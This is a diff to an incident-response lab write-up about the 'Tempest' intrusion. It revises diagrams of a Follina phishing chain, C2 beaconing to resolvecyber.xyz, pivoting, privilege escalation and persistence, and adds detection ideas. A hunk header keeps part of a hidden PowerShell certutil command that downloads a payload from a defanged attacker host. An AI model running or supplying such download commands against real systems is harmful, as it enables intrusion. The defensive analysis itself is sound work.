@@ -24,20 +24,8 @@
 
 ## Attack at a Glance
 
-```mermaid
-graph TD
-    A["1. Phishing - user downloads free_magicules.doc in Chrome"] --> B["2. Word opens the doc - Follina exploit runs msdt.exe"]
-    B --> C["3. Base64 PowerShell payload drops update.zip in Startup folder"]
-    C --> D["4. Persistence - payload runs at every login"]
-    D --> E["5. Stage 2 - first.exe downloaded with certutil"]
-    E --> F["6. C2 beaconing over HTTP to resolvecyber.xyz"]
-    F --> G["7. Discovery - whoami, net user, netstat, saved password found"]
-    G --> H["8. Pivot - Chisel reverse SOCKS proxy then WinRM login"]
-    H --> I["9. Privilege escalation - PrintSpoofer to SYSTEM"]
-    I --> J["10. final.exe runs as SYSTEM with C2 on port 8080"]
-    J --> K["11. Backdoor accounts shion and shuna created"]
-    K --> L["12. Service persistence - TempestUpdate2 runs final.exe at boot"]
-```
+<img width="758" height="2179" alt="tempest_attack_chain" src="https://github.com/user-attachments/assets/d12117d1-5584-4432-8739-2305b85b84bf" />
+
 
 ## Glossary (terms used below)
 
@@ -154,16 +142,15 @@ powershell.exe -w hidden -noni certutil -urlcache -split -f 'hxxp://phishteam[.]
 | Encoding of the data | **Base64** (decode the `q=` value in CyberChef and you get the commands and output that Sysmon also showed) |
 | Language used to compile the binary | **Nim** (User-Agent: `Nim httpclient/1.6.6`) |
 
-```mermaid
-sequenceDiagram
-    participant V as Victim TEMPEST
-    participant C as C2 server resolvecyber.xyz
-    loop Beaconing
-        V->>C: GET /9ab62b5 - any commands for me
-        C-->>V: Command to run
-        V->>C: GET /9ab62b5 with q = Base64 of command output
-    end
-```
+````text
+Victim (TEMPEST)                         C2 server (resolvecyber.xyz)
+      |                                              |
+      |---- GET /9ab62b5 ------------------------->  |   any commands for me?
+      |<--- command to run ------------------------  |
+      |---- GET /9ab62b5?q=<Base64 output> -------->  |   results of the command
+      |                                              |
+      |        (repeats every few seconds)           |
+````
 
 **Detection ideas:** an unusual User-Agent (`Nim httpclient`), a repeated request to the same short path, and long Base64 values in a URL parameter.
 
